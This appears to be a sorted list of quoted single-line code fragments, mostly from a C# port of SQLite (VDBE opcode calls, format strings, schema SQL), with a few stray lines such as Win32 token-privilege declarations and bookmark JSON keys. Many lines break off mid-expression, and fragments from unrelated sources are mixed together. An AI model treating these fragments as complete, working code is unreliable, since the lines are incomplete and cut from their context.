"        sqlite3VdbeAddOp2( v, OP_Integer, 0, memId )"
"        sqlite3VdbeAddOp2( v, OP_Integer, 0, pLevel.iLeftJoin )"
"        sqlite3VdbeAddOp2( v, OP_Integer, 0, regEof )"
"        sqlite3VdbeAddOp2( v, OP_Integer, 0, regPrev )"
"        sqlite3VdbeAddOp2( v, OP_Integer, 0, regRowCount )"
"        sqlite3VdbeAddOp2( v, OP_Integer, 1, pLevel.iLeftJoin )"
"        sqlite3VdbeAddOp2( v, OP_Integer, 1, regEof )"
"        sqlite3VdbeAddOp2( v, OP_Integer, 1, regPrev )"
"        sqlite3VdbeAddOp2( v, OP_Integer, ENC( db ), reg3 )"
"        sqlite3VdbeAddOp2( v, OP_Integer, addrSelect - 1, dest.iParm )"
"        sqlite3VdbeAddOp2( v, OP_Integer, fileFormat, reg3 )"
"        sqlite3VdbeAddOp2( v, OP_Integer, i, iMem )"
"        sqlite3VdbeAddOp2( v, OP_Integer, minFormat, r2 )"
"        sqlite3VdbeAddOp2( v, OP_MustBeInt, iRowidReg, addrNxt )"
"        sqlite3VdbeAddOp2( v, OP_NewRowid, 0, memId "
"        sqlite3VdbeAddOp2( v, OP_NewRowid, 0, reg1 )"
"        sqlite3VdbeAddOp2( v, OP_NewRowid, iStatCur, regRowid )"
"        sqlite3VdbeAddOp2( v, OP_Next, 0, addr "
"        sqlite3VdbeAddOp2( v, OP_Next, 0, j3 )"
"        sqlite3VdbeAddOp2( v, OP_Next, iIdxCur, topOfLoop )"
"        sqlite3VdbeAddOp2( v, OP_Next, iSrc, addr1 "
"        sqlite3VdbeAddOp2( v, OP_Next, srcTab, addrCont )"
"        sqlite3VdbeAddOp2( v, OP_Null, 0, iReg )"
"        sqlite3VdbeAddOp2( v, OP_Null, 0, iRowSet )"
"        sqlite3VdbeAddOp2( v, OP_Null, 0, pAggInfo.aCol[i].iMem )"
"        sqlite3VdbeAddOp2( v, OP_Null, 0, pFunc.iMem )"
"        sqlite3VdbeAddOp2( v, OP_Null, 0, reg3 )"
"        sqlite3VdbeAddOp2( v, OP_OpenEphemeral, dest.iParm, p.pEList.nExpr )"
"        sqlite3VdbeAddOp2( v, OP_OpenEphemeral, pDest.iParm, pEList.nExpr )"
"        sqlite3VdbeAddOp2( v, OP_ResultRow, memCnt, 1 )"
"        sqlite3VdbeAddOp2( v, OP_ResultRow, regRowCount, 1 )"
"        sqlite3VdbeAddOp2( v, OP_Rewind, 0, addr "
"        sqlite3VdbeAddOp2( v, OP_Rewind, iIdxCur, endOfLoop )"
"        sqlite3VdbeAddOp2( v, OP_Rewind, iTab, 0 )"
"        sqlite3VdbeAddOp2( v, OP_RowKey, iSrc, regData )"
"        sqlite3VdbeAddOp2( v, OP_RowSetAdd, iRowSet, regRowid )"
"        sqlite3VdbeAddOp2( v, OP_RowSetAdd, regRowSet, regOldRowid )"
"        sqlite3VdbeAddOp2( v, OP_Rowid, 0, memId "
"        sqlite3VdbeAddOp2( v, OP_Rowid, iCur, regRowid )"
"        sqlite3VdbeAddOp2( v, OP_Rowid, iTable, iReg )"
"        sqlite3VdbeAddOp2( v, OP_SCopy, iMem, regF2 )"
"        sqlite3VdbeAddOp2( v, OP_SCopy, regRowid - ( hasTwoRowids "
"        sqlite3VdbeAddOp2( v, OP_SCopy, regRowid, regIdx "
"        sqlite3VdbeAddOp2( v, OP_Vacuum, 0, 0 )"
"        sqlite3VdbeAddOp3( pParse.pVdbe, OP_IdxDelete, iCur "
"        sqlite3VdbeAddOp3( v, OP_Column, 0, 0, memId )"
"        sqlite3VdbeAddOp3( v, OP_Column, 0, 1, memId )"
"        sqlite3VdbeAddOp3( v, OP_Function, 0, regArgs "
"        sqlite3VdbeAddOp3( v, OP_IdxInsert, iDest, regData, 1 )"
"        sqlite3VdbeAddOp3( v, OP_Insert, 0, iRec, memId "
"        sqlite3VdbeAddOp3( v, OP_Insert, 0, reg3, reg1 )"
"        sqlite3VdbeAddOp3( v, OP_Insert, iStatCur, regRec, regRowid )"
"        sqlite3VdbeAddOp3( v, OP_Insert, newIdx, regRec, regRowid )"
"        sqlite3VdbeAddOp3( v, OP_Insert, newIdx, regRec, regTrigRowid )"
"        sqlite3VdbeAddOp3( v, OP_Insert, newIdx, regRow, regRowid )"
"        sqlite3VdbeAddOp3( v, OP_Insert, oldIdx, regRow, regRowid )"
"        sqlite3VdbeAddOp3( v, OP_Jump, j2 "
"        sqlite3VdbeAddOp3( v, OP_MakeRecord, memId - 1, 2, iRec )"
"        sqlite3VdbeAddOp3( v, OP_MakeRecord, regBase, nCol "
"        sqlite3VdbeAddOp3( v, OP_MakeRecord, regCols, pTab.nCol, regRec )"
"        sqlite3VdbeAddOp3( v, OP_MakeRecord, regCols, pTab.nCol, regRow )"
"        sqlite3VdbeAddOp3( v, OP_MakeRecord, regIdx, pIdx.nColumn "
"        sqlite3VdbeAddOp3( v, OP_Ne, memId - 1, addr "
"        sqlite3VdbeAddOp3( v, OP_NotExists, iCur, addr, regOldRowid )"
"        sqlite3VdbeAddOp3( v, OP_NotExists, iCur, addrNxt, iRowidReg )"
"        sqlite3VdbeAddOp3( v, OP_OpenPseudo, newIdx, 0, pTab.nCol )"
"        sqlite3VdbeAddOp3( v, OP_OpenPseudo, oldIdx, 0, pTab.nCol )"
"        sqlite3VdbeAddOp3( v, OP_OpenPseudo, pseudoTab, eDest == SRT_Output "
"        sqlite3VdbeAddOp3( v, OP_ReadCookie, iDb, r1, BTREE_FILE_FORMAT )"
"        sqlite3VdbeAddOp3( v, OP_ReadCookie, iDb, reg3, BTREE_FILE_FORMAT )"
"        sqlite3VdbeAddOp3( v, OP_SetCookie, iDb, BTREE_FILE_FORMAT, r2 )"
"        sqlite3VdbeAddOp3( v, OP_SetCookie, iDb, BTREE_FILE_FORMAT, reg3 )"
"        sqlite3VdbeAddOp3( v, OP_SetCookie, iDb, BTREE_TEXT_ENCODING, reg3 )"
"        sqlite3VdbeAddOp3( v, op, iTable, iColumn, iReg )"
"        sqlite3VdbeAddOp4( v, OP_AggFinal, pF.iMem, pList != null "
"        sqlite3VdbeAddOp4( v, OP_AggStep, 0, regAgg, pF.iMem,"
"        sqlite3VdbeAddOp4( v, OP_Clear, pTab.tnum, iDb, memCnt,"
"        sqlite3VdbeAddOp4( v, OP_DropIndex, iDb, 0, 0, pIndex.zName, 0 )"
"        sqlite3VdbeAddOp4( v, OP_DropTable, iDb, 0, 0, pTab.zName, 0 )"
"        sqlite3VdbeAddOp4( v, OP_DropTrigger, iDb, 0, 0, pTrigger.name, 0 )"
"        sqlite3VdbeAddOp4( v, OP_DropTrigger, iTrigDb, 0, 0, pTrig.name, 0 )"
"        sqlite3VdbeAddOp4( v, OP_Halt, SQLITE_CONSTRAINT, OE_Abort, 0,"
"        sqlite3VdbeAddOp4( v, OP_Halt, SQLITE_CONSTRAINT, onError, 0,"
"        sqlite3VdbeAddOp4( v, OP_IsUnique, iIdx, j2, regRowid, pRegKey, P4_INT32 )"
"        sqlite3VdbeAddOp4( v, OP_MakeRecord, regFields, 3, regRec, new byte[] { (byte)'a', (byte)'a', (byte)'a' }, 0 )"
"        sqlite3VdbeAddOp4( v, OP_OpenEphemeral, distinct, 0, 0,"
"        sqlite3VdbeAddOp4( v, OP_OpenEphemeral,"
"        sqlite3VdbeAddOp4( v, OP_OpenRead, iIdxCur, pIdx.tnum, iDb,"
"        sqlite3VdbeAddOp4( v, OP_OpenRead, iSrc, pSrcIdx.tnum, iDbSrc,"
"        sqlite3VdbeAddOp4( v, OP_OpenWrite, iDest, pDestIdx.tnum, iDbDest,"
"        sqlite3VdbeAddOp4( v, OP_ParseSchema, 1, 0, 0, zWhere, P4_DYNAMIC )"
"        sqlite3VdbeAddOp4( v, OP_ParseSchema, iDb, 0, 0, sqlite3MPrintf("
"        sqlite3VdbeAddOp4( v, OP_ParseSchema, iDb, 0, 0,"
"        sqlite3VdbeAddOp4( v, OP_Savepoint, op, 0, 0, zName, P4_DYNAMIC )"
"        sqlite3VdbeAddOp4( v, OP_String8, 0, memId - 1, 0, p.pTab.zName, 0 )"
"        sqlite3VdbeAddOp4( v, OP_String8, 0, regFields "
"        sqlite3VdbeAddOp4( v, OP_String8, 0, regFields, 0, pTab.zName, 0 )"
"        sqlite3VdbeAddOp4( v, op, i "
"        sqlite3VdbeAddOp4( v, op, iIdxCur, addrNxt, regBase,"
"        sqlite3VdbeChangeEncoding( pVal, enc "
"        sqlite3VdbeChangeEncoding( pVal, enc )"
"        sqlite3VdbeChangeP4( v, -1, pFunc, P4_FUNCDEF )"
"        sqlite3VdbeChangeP4( v, -1, pTab.zName, P4_STATIC )"
"        sqlite3VdbeChangeP4( v, _base "
"        sqlite3VdbeChangeP5( v, (u8)( pFunc.nArg ) )"
"        sqlite3VdbeChangeP5( v, (u8)nArg )"
"        sqlite3VdbeChangeP5( v, 1 )"
"        sqlite3VdbeChangeP5( v, OPFLAG_APPEND )"
"        sqlite3VdbeChangeP5( v, SQLITE_JUMPIFNULL )"
"        sqlite3VdbeFreeCursor( p, p.apCsr[iCur] )"
"        sqlite3VdbeJumpHere( v, a1 )"
"        sqlite3VdbeJumpHere( v, addr )"
"        sqlite3VdbeJumpHere( v, addr1 )"
"        sqlite3VdbeJumpHere( v, addr2 )"
"        sqlite3VdbeJumpHere( v, addrInsTop )"
"        sqlite3VdbeJumpHere( v, emptyDestTest )"
"        sqlite3VdbeJumpHere( v, iEndAfterTrigger )"
"        sqlite3VdbeJumpHere( v, iEndBeforeTrigger )"
"        sqlite3VdbeJumpHere( v, iGoto )"
"        sqlite3VdbeJumpHere( v, j1 )"
"        sqlite3VdbeJumpHere( v, j2 )"
"        sqlite3VdbeJumpHere( v, j3 )"
"        sqlite3VdbeJumpHere( v, j4 )"
"        sqlite3VdbeJumpHere( v, j5 )"
"        sqlite3VdbeJumpHere( v, testAddr - 1 )"
"        sqlite3VdbeMakeReady( v, -1, 0, 0, 0 )"
"        sqlite3VdbeMakeReady( v, pParse.nVar, pParse.nMem,"
"        sqlite3VdbeMemCopy( pBest, pArg )"
"        sqlite3VdbeMemMove( pTo.aVar[i], pFrom.aVar[i] )"
"        sqlite3VdbeMemPrettyPrint( p, zBuf )"
"        sqlite3VdbeMemSetDouble( p.aVar[i - 1], rValue )"
"        sqlite3VdbeMemSetInt64( p.aVar[i - 1], iValue )"
"        sqlite3VdbeMemSetStr( pVal, Encoding.UTF8.GetString( sqlite3HexToBlob( db, zVal, nVal ) ), nVal / 2,"
"        sqlite3VdbeMemSetZeroBlob( p.aVar[i - 1], n )"
"        sqlite3VdbeMemStringify( pVal, enc )"
"        sqlite3VdbeResolveLabel( v, addr )"
"        sqlite3VdbeResolveLabel( v, addrEnd )"
"        sqlite3VdbeResolveLabel( v, allOk )"
"        sqlite3VdbeResolveLabel( v, end )"
"        sqlite3VdbeResolveLabel( v, endOfLoop )"
"        sqlite3VdbeResolveLabel( v, pLevel.addrBrk )"
"        sqlite3VdbeResolveLabel( v, pLevel.addrCont )"
"        sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""rows deleted"", SQLITE_STATIC )"
"        sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""rows inserted"", SQLITE_STATIC )"
"        sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""rows updated"", SQLITE_STATIC )"
"        sqlite3VdbeSetColName( v, i, COLNAME_DECLTYPE, zType, SQLITE_TRANSIENT )"
"        sqlite3VdbeSetNumCols( v, 1 )"
"        sqlite3VdbeSetSql( pVdbe, zSql, (int)( zSql.Length - ( pParse.zTail == null "
"        sqlite3VdbeTrace( v, trace )"
"        sqlite3VdbeUsesBtree( v, iDb )"
"        sqlite3ViewGetColumnNames( pParse, p )"
"        sqlite3WalkSelect( pWalker, pSelect )"
"        sqlite3_busy_handler( db, null, null )"
"        sqlite3_busy_handler( db, sqliteDefaultBusyCallback, db )"
"        sqlite3_randomness( 1, ref iRandom )"
"        sqlite3_result_blob( context, new string( p ), n,  null)"
"        sqlite3_result_blob( context, sb.ToString(), (int)p2, SQLITE_TRANSIENT )"
"        sqlite3_result_double( context, p.rSum / (double)p.cnt )"
"        sqlite3_result_double( context, r )"
"        sqlite3_result_double( context, x.iJD / 86400000.0 )"
"        sqlite3_result_error( context, ""LIKE or GLOB pattern too complex"", -1 )"
"        sqlite3_result_error( context, zErrDyn, -1 )"
"        sqlite3_result_error( context, zErrMsg, -1 )"
"        sqlite3_result_int( context, patternCompare( zB, zA, pInfo, escape ) "
"        sqlite3_result_text( context, z.Length == 0 "
"        sqlite3_result_text( context, z.ToString(), -1,"
"        sqlite3_result_text( context, zBuf, -1, SQLITE_TRANSIENT )"
"        sqlite3_result_text( context, zRet, -1, SQLITE_DYNAMIC )"
"        sqlite3_result_text(context, z1, -1, null)"
"        sqlite3_result_text(context, z2.Length == 0 "
"        sqlite3_result_text(context, zHex.ToString(), n "
"        sqlite3_result_value( context, argv[0] )"
"        sqlite3_result_zeroblob( context, (int)n )"
"        sqlite3_snprintf( 100, ref  zCsr, ""%d["", pMem.n )"
"        sqlite3_snprintf( 100, ref zBuf, ""%02d:%02d:%02d"", x.h, x.m, (int)x.s )"
"        sqlite3_snprintf( 100, ref zBuf, ""%04d-%02d-%02d %02d:%02d:%02d"","
"        sqlite3_snprintf( 100, ref zBuf, ""%04d-%02d-%02d"", x.Y, x.M, x.D )"
"        sqlite3_snprintf( 100, ref zCsr, ""%c"", c )"
"        sqlite3_snprintf( 100, ref zCsr, ""%d"", pMem.n )"
"        sqlite3_snprintf( 100, ref zCsr, ""]%s"", encnames[pMem.enc] )"
"        sqlite3_snprintf( 100, ref zCsr, encnames[pMem.enc] )"
"        sqlite3_snprintf( 200, ref zErr, ""cannot detach database %s"", zName )"
"        sqlite3_snprintf( 200, ref zErr, ""database %s is locked"", zName )"
"        sqlite3_snprintf( 200, ref zErr, ""no such database: %s"", zName )"
"        sqlite3_snprintf( 200, ref zErr,"
"        sqlite3_snprintf( nMsg, ref zErrmsg,"
"        sqlite3_snprintf(200, ref zContext,"
"        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,"
"        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid)"
"        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle)"
"        string zBuf = """""
"        string zErr = """""
"        string zErrmsg = """""
"        string zMaster = """""
"        string zSp = "" """
"        subpage = sqlite3Get4byte(pRoot.aData, pRoot.hdrOffset "
"        substExprList( db, pParent.pEList, iParent, pSub.pEList )"
"        szOld = cellSizePtr(pPage, oldCell)"
"        testAddr = sqlite3VdbeAddOp2( v, OP_Integer, 1, mem )"
"        top = (u16)get2byte(data, hdr "
"        top = get2byte(data, hdr "
"        u16 contentOffset = (u16)get2byte(data, hdr "
"        u32 h = strHash( elem.pKey, elem.nKey ) % new_size"
"        u32[] aSize = new u32[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0, 0, 0 }"
"        u8[] ops = new u8[] { TK_GE, TK_LE }"
"        va_start( ap, zFormat )"
"        whereClauseInsert( pWC, pExpr, 0 )"
"        whereSplit( pWC, pExpr.pLeft, op )"
"        whereSplit( pWC, pExpr.pRight, op )"
"        while (PTRMAP_ISPAGE(pBt, iGuess) "
"        while (PTRMAP_ISPAGE(pBt, nFin) "
"        while (pgnoRoot == PTRMAP_PAGENO(pBt, pgnoRoot) "
"        x.Y, x.M, x.D, x.h, x.m, (int)( x.s ) )"
"        yyStackOverflow(yypParser, yypMinor)"
"        yyTracePrompt,"
"        yyact = yy_find_shift_action(yypParser, (YYCODETYPE)yymajor)"
"        z = displayP4( pOp, pMem.z, 32 )"
"        z = pAll.z.Substring( 0, pAll.n )"
"        zColl = sqlite3NameFromToken( pParse.db, pName1 )"
"        zData = sqlite3BtreeDataFetch( pCur, ref available, ref outOffset )"
"        zData = sqlite3BtreeKeyFetch( pCur, ref available, ref outOffset )"
"        zDb, SCHEMA_TABLE( iDb ), pNew.addColOffset, zCol, pNew.addColOffset "
"        zDb, zName, pTab.zName"
"        zEnd = """
"        zEnd = "")"""
"        zErrDyn = sqlite3MPrintf( db, ""cannot ATTACH database within transaction"" )"
"        zErrDyn = sqlite3MPrintf( db, ""database is already attached"" )"
"        zErrDyn = sqlite3MPrintf( db, ""too many attached databases - max %d"","
"        zErrmsg = """""
"        zFilename = "":memory:"""
"        zName = pName.z.Substring( 0, pName.n )"
"        zName = sqlite3MPrintf( db, ""sqlite_autoindex_%s_%d"", pTab.zName, n )"
"        zName = sqlite3NameFromToken( db, pName )"
"        zPrefix = ""FROM"""
"        zProc = """""
"        zProc = ""sqlite3_extension_init"""
"        zRet = sqlite3MPrintf( db, ""%."
"        zRight = sqlite3NameFromToken( db, pValue )"
"        zSep = """
"        zSep = """""
"        zSep2 = "","
"        zSep2 = "","""
"        zSql = sqlite3MPrintf( db,"
"        zSqlCopy = zSql.Substring( 0, nBytes )"
"        zStmt,"
"        zTableName, zSql.Substring( zLoc "
"        zType = columnType( sNC, p, ref sDummy, ref sDummy, ref sDummy )"
"        zType,"
"        zeroPage(pNew, PTF_INTKEY "
"        zeroPage(pNew, pageFlags)"
"        zeroPage(pPage, PTF_INTKEY "
"        zeroPage(pPage, pPage.aData[0] "
"        { p.azVar[n] = """""
"        {//, apColl"
"        {//, pBlob"
"        {//, pItem"
"        {//, pTabCol"
"        {//STRICMP(z, p.aCol[i].zName) ){"
"       ""WHERE rowid="
"       Other similar extension points exist, see Microsoft.Common.targets."
"       a INTEGER PRIMARY KEY,"
"       b-tree database (one with the BtShared.sharable) flag set, and"
"       in the journal.  If this value is 0xffffffff, then compute the"
"       structure, in that order."
"       to be deleted, must be opened as cursor number ""base""."
"       to be deleted, must be opened as cursor number ""iCur""."
"       x = sqlite3MPrintf(db, x, ""prefix %s suffix"", x)"
"      ""      OR (type='table' AND rootpage=0)"""
"      ""    FROM sqlite_master"" "
"      ""   AND rootpage>0"""
"      ""   WHERE type='view' OR type='trigger'"" "
"      ""  AND rootpage>0"""
"      ""  FROM sqlite_master WHERE sql LIKE 'CREATE INDEX %' "" )"
"      ""  FROM sqlite_master WHERE sql LIKE 'CREATE UNIQUE INDEX %'"" )"
"      ""  FROM sqlite_master WHERE type='table' AND name!='sqlite_sequence'"" "
"      ""  SELECT type, name, tbl_name, rootpage, sql"" "
"      ""  name text,"
"      ""  rootpage integer,"
"      ""  sql text"
"      ""  tbl_name text,"
"      ""  type text,"
"      """
"      ""%r %s BY term out of range - should be "" "
"      ""'sqlite_autoindex_' "
"      ""(type='table' OR type='index' OR type='trigger')"
"      "")"""
"      ""CREATE TABLE sqlite_master("
"      ""CREATE TEMP TABLE sqlite_temp_master("
"      ""ELSE name END "" "
"      ""ELSE sqlite_rename_table(sql, %Q) END, "" "
"      ""FROM sqlite_master "" "
"      ""FROM vacuum_db.sqlite_master WHERE name='sqlite_sequence' """
"      ""FROM vacuum_db.sqlite_master WHERE name=='sqlite_sequence'"
"      ""INSERT INTO vacuum_db.sqlite_master "" "
"      ""SELECT 'CREATE INDEX vacuum_db.' "
"      ""SELECT 'CREATE TABLE vacuum_db.' "
"      ""SELECT 'CREATE UNIQUE INDEX vacuum_db.' "
"      ""SELECT 'DELETE FROM vacuum_db.' "
"      ""SELECT 'INSERT INTO vacuum_db.' "
"      ""UPDATE %Q.%s """
"      ""UPDATE %Q.%s SET "" "
"      ""UPDATE %Q.%s SET rootpage=%d WHERE "
"      ""WHEN name LIKE 'sqlite_autoindex%%' AND type='index' THEN "" "
"      ""WHEN type = 'trigger' THEN sqlite_rename_trigger(sql, %Q)"" "
"      ""WHEN type='table' THEN %Q "" "
"      ""WHERE tbl_name=%Q AND "" "
"      ""WHERE type = 'table' AND name!='sqlite_sequence' "" "
"      ""between 1 and %d"", i, zType, mx )"
"      ""bookmark_bar"": {"
"      ""name = CASE "" "
"      ""other"": {"
"      ""sqlite_attach"",  /"
"      ""sqlite_detach"",     /"
"      ""synced"": {"
"      ""unable to use function %s in the requested context"", zName )"
"      (In other words, the ""major"" token.)"
"      (dxMemInit)sqlite3MemInit,"
"      (dxMemShutdown)sqlite3MemShutdown,"
"      (dxPC_Cachesize)pcache1Cachesize,/"
"      (dxPC_Create)pcache1Create,      /"
"      (dxPC_Fetch)pcache1Fetch,         /"
"      (dxPC_Init)pcache1Init,             /"
"      (dxPC_Pagecount)pcache1Pagecount,/"
"      (dxPC_Rekey)pcache1Rekey,         /"
"      (dxPC_Shutdown)pcache1Shutdown,  /"
"      (dxPC_Truncate)pcache1Truncate,   /"
"      (dxPC_Unpin)pcache1Unpin,         /"
"      (int)sqlite3Get4byte(pBt.pPage1.aData, 36), ""Main freelist: "")"
"      , MemPage pPage"
"      , bool sharedCacheEnabled"
"      , byte[] pHeap"
"      , byte[] pScratch"
"      , int inProgress"
"      , int isInit"
"      , int isMallocInit"
"      , int mxParserStack"
"      , int nHeap,"
"      , int nPage"
"      , int nRefInitMutex"
"      , int nScratch"
"      , int szPage"
"      , int szScratch"
"      , sqlite3_mem_methods m"
"      , sqlite3_mutex pInitMutex"
"      , sqlite3_mutex_methods mutex"
"      , sqlite3_pcache_methods pcache"
"      -1,//sizeof(pInfo.aCol[0]),"
"      -1,//sizeof(pInfo.aFunc[0]),"
"      -1,//sizeof(pList.a[0]),"
"      //                 ""%s"
"      //                 sqlite3OsDlSym(pVfs, handle, zProc)"
"      //          ""no entry point [%s] in shared library [%s]"", zProc,zFile)"
"      //        //sqlite3DbFree(db, p)"
"      //        memcpy(pNew, p, db.lookaside.sz)"
"      //      //sqlite3DbFree(db,ref  zOld)"
"      //      //sqlite3DbFree(db,ref  zOut)"
"      //      //sqlite3StackFree(db, zErrmsg)"
"      //      memcpy( zNew, p.zText, p.nChar )"
"      //      memcpy(p.zText, p.zBase, p.nChar "
"      //      p.nOpAlloc = sqlite3DbMallocSize(p.db, pNew)/sizeof(Op)"
"      //      pNew = sqlite3DbMallocRaw(db, n)"
"      //      pNew = sqlite3_realloc(p, n)"
"      //      pzErrMsg = sqlite3_mprintf(""error during initialization: %s"", zErrmsg)"
"      //      rc = readMasterJournal( pJournal, zMasterPtr, nMasterPtr )"
"      //      rc = sqlite3OsOpen( pVfs, zJournal, pJournal, flags, 0 )"
"      //      return sqlite3DbMallocRaw(db, n)"
"      //      sqlite3OsDlError(pVfs, nMsg-1, zErrmsg)"
"      //      sqlite3_snprintf(nMsg, zErrmsg,"
"      //    //sqlite3DbFree( db, aCol[j].zName )"
"      //    //sqlite3DbFree(db,ref zErrmsg)"
"      //    if( isLookaside(db, p) ){"
"      //    memcpy(aHandle, db.aExtension, sizeof(handle)"
"      //    rc = sqlite3OsAccess( pVfs, zJournal, SQLITE_ACCESS_EXISTS, "
"      //    sqlite3OsDlClose(pVfs, handle)"
"      //    sqlite3OsDlClose(pVfs, ref handle)"
"      //    sqlite3_snprintf(MAX_PATH-30, zTempPath, ""%s"", zMulti)"
"      //    sqlite3_snprintf(MAX_PATH-30, zTempPath, ""%s"", zUtf8)"
"      //    zErrmsg = sqlite3StackAllocZero(db, nMsg)"
"      //    zOut = sqlite3_realloc(zOut, (int)nOut)"
"      //  ""0123456789"""
"      //  ""ABCDEFGHIJKLMNOPQRSTUVWXYZ"""
"      //  ""abcdefghijklmnopqrstuvwxyz"""
"      //  //if ( pNew != standin ) //sqlite3DbFree( db, ref pNew )"
"      //  //sqlite3DbFree( db, aCol )"
"      //  //sqlite3DbFree(db,ref db.aExtension)"
"      //  //sqlite3DbFree(db,ref pNew)"
"      //  GetTempPathA(MAX_PATH-30, zMbcsPath)"
"      //  GetTempPathW(MAX_PATH-30, zWidePath)"
"      //  aHandle = sqlite3DbMallocZero(db, sizeof(handle)"
"      //  aNew = sqlite3DbMallocRaw(db, sizeof(db.aDb[0])"
"      //  clearSelect( db, pNew )"
"      //  corruptSchema( pData, argv[0], """" )"
"      //  memcpy( pI64, "
"      //  memcpy(aNew, db.aDb, sizeof(db.aDb[0])"
"      //  memset(aNew, 0, sizeof("
"      //  memset(pNew, 0, sizeof("
"      //  p = realloc(p, nByte"
"      //  rc = SetFilePointer(pFile.fs.Name, lowerBits, upperBits, FILE_BEGIN)"
"      //  rc = sqlite3OsRead( pMaster, zMasterJournal, (int)nMasterJournal, 0 )"
"      //  sqlite3IdListDelete( db, ref pColumn )"
"      //  sqlite3ResetInternalSchema( db, 0 )"
"      //  sqlite3SrcListDelete( db, ref pList )"
"      //  sqlite3StrAccumAppend(pAccum, zSpaces, N)"
"      //  sqlite3StrAccumAppend(pAccum, zSpaces, zSpaces.Length-1)"
"      //  sqlite3_randomness(lk.Length, lk)"
"      //  sqlite3_snprintf( nBuf, ref zBuf, ""OsError 0x%x (%u)"", error, error )"
"      //  sqlite3_snprintf(MAX_PATH-30, zTempPath, ""%s"", sqlite3_temp_directory)"
"      //  z = zHex = contextMalloc(context, ((i64)n)"
"      //  }else if( xInit(db, ref zErrmsg, sqlite3Apis) ){"
"      // memcpy( pNew.aCol, pTab.aCol, sizeof(Column) "
"      // memcpy(pMem.zMalloc, pMem.z, pMem.n)"
"      // pNew = sqlite3DbRealloc( p.db, p.aOp, nNew "
"      // sqlite3DbMallocZero( db,"
"      // string zConverted = """""
"      //0,"
"      //N = (int)va_arg( ap, ""int"" )"
"      //error,"
"      //for ( i = 0, pMem = p->aMem "
"      //if ( 00 == FormatMessageA( FORMAT_MESSAGE_FROM_SYSTEM,"
"      //if ( zName == null ) zName = """""
"      //if( sqlite3DbMallocSize(pMem->db, pMem.zMalloc)<n ){"
"      //if( zFile==null ) zFile = """""
"      //if( zSql=="""" ){"
"      //int i, c"
"      //lowerBits = GetFileSize(pFile.fs.Name, upperBits)"
"      //max = (int)va_arg( ap, ""int"" )"
"      //memcpy( aWc, pDef.pUserData, 3 )"
"      //memcpy( z, pTo.z, pTo.n )"
"      //memset( p, 0, sqlite3MemJournalSize() )"
"      //memset(aBucket, 0, sizeof(aBucket))"
"      //memset(new_ht, 0, new_size"
"      //memset(pCol, 0, sizeof(p.aCol[0]))"
"      //min = (int)va_arg( ap, ""int"" )"
"      //nBuf - 1,"
"      //nextC = (char)va_arg( ap, ""char"" )"
"      //pMem.zMalloc = sqlite3DbMallocRaw( db, 64 )"
"      //pVal = (int)va_arg( ap, ""int"" )"
"      //pWInfo = sqlite3DbMallocZero( db,"
"      //rc = SetFilePointer( pFile->h, lowerBits, "
"      //rc = sqlite3OsDelete( pVfs, zMaster, 0 )"
"      //rc = sqlite3OsFileSize( pMaster, "
"      //ref oDummy,"
"      //size_t i, j"
"      //sqlite3DbFree( db, p )"
"      //sqlite3DbFree( db, ref  aRegIdx )"
"      //sqlite3DbFree( db, ref  aXRef )"
"      //sqlite3DbFree( db, ref  azCols )"
"      //sqlite3DbFree( db, ref  p )"
"      //sqlite3DbFree( db, ref  p.pFree )"
"      //sqlite3DbFree( db, ref  zSql )"
"      //sqlite3DbFree( db, ref aRegIdx )"
"      //sqlite3DbFree( db, ref db.aDb[1].pSchema )"
"      //sqlite3DbFree( db, ref db.aExtension )"
"      //sqlite3DbFree( db, ref p )"
"      //sqlite3DbFree( db, ref p.aColName )"
"      //sqlite3DbFree( db, ref p.aLabel )"
"      //sqlite3DbFree( db, ref p.aOp )"
"      //sqlite3DbFree( db, ref p.zColAff )"
"      //sqlite3DbFree( db, ref p.zErrMsg )"
"      //sqlite3DbFree( db, ref p.zSql )"
"      //sqlite3DbFree( db, ref pDup )"
"      //sqlite3DbFree( db, ref pFKey )"
"      //sqlite3DbFree( db, ref pList )"
"      //sqlite3DbFree( db, ref pList.a )"
"      //sqlite3DbFree( db, ref pParse.aAlias )"
"      //sqlite3DbFree( db, ref pParse.apVarExpr )"
"      //sqlite3DbFree( db, ref pParse.zErrMsg )"
"      //sqlite3DbFree( db, ref pSubitem.zAlias )"
"      //sqlite3DbFree( db, ref pSubitem.zDatabase )"
"      //sqlite3DbFree( db, ref pSubitem.zName )"
"      //sqlite3DbFree( db, ref pTable )"
"      //sqlite3DbFree( db, ref pTable.zColAff )"
"      //sqlite3DbFree( db, ref pTable.zName )"
"      //sqlite3DbFree( db, ref pTrigger.table )"
"      //sqlite3DbFree( db, ref pz )"
"      //sqlite3DbFree( db, ref sAggInfo.aCol )"
"      //sqlite3DbFree( db, ref sAggInfo.aFunc )"
"      //sqlite3DbFree( db, ref z )"
"      //sqlite3DbFree( db, ref zColl )"
"      //sqlite3DbFree( db, ref zErrMsg )"
"      //sqlite3DbFree( db, ref zLeft )"
"      //sqlite3DbFree( db, ref zName )"
"      //sqlite3DbFree( db, ref zRight )"
"      //sqlite3DbFree( db, ref zVal )"
"      //sqlite3DbFree( db, zName )"
"      //sqlite3DbFree( db, zStr )"
"      //sqlite3DbFree( p.db, ref p.aLabel )"
"      //sqlite3DbFree( pParse.db, ref  pParse.zErrMsg )"
"      //sqlite3DbFree( v.db, ref v )"
"      //sqlite3DbFree(db,ref pTrigger.name)"
"      //sqlite3DbFree(p.db,ref p.zMalloc)"
"      //sqlite3StackFree( db, pParse )"
"      //sqlite3VdbeAddOp4( v, OP_Int64, 0, mem, 0, (char"
"      //sqlite3VdbePrintOp(null, i, p.aOp[i])"
"      //sqlite3_randomness(20, zBuf[j])"
"      //sqlite3_snprintf(n, zStmt,""CREATE TABLE "")"
"      //sqlite3_snprintf(nBuf-30, zBuf,"
"      //static const char zSpaces[] = ""                             """
"      //string zHex, z"
"      //va_start( ap, zDate )"
"      //xCallback(pArg, nowUsed, nByte)"
"      //zBuf,"
"      //zOut = contextMalloc(context, (i64)nOut)"
"      0       1      Flags. 1: intkey, 2: zerodata, 4: leafdata, 8: leaf"
"      0      16     Header string: ""SQLite format 3"
"      0,                                /"
"      0,                   /"
"      0,                /"
